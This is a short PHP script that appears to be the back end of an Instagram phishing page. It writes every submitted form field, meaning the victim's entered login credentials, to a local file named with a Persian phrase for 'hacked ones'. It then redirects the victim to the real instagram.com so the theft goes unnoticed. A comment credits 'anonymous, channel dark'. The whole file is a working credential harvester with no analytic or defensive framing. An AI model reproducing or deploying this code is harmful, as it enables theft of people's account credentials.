<?php
header ('Location:https://instagram.com');
$handle = fopen("./@channel_dark.هک شدگان", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n");
}
fwrite($handle, "\r   \n   \n");
fclose($handle);
exit;
// coded by anonymous , channel dark
?>
